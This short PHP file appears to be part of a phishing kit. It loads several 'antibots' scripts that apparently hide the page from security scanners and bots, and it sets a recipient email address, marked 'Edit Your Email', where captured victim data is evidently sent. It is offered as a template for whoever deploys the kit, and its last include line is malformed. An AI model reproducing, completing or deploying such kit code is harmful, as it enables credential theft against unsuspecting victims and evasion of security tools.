<?php
include 'hostname_check.php'; 
include 'antibots/bots.php';
include 'antibots/bot.php';
include 'antibots/checkbots.php';
include 'antibots/perfect.php';


$to = 'zdingaw4@gmail.com'; // Edit Your Email


include(__DIR__).'/app/antibots.php';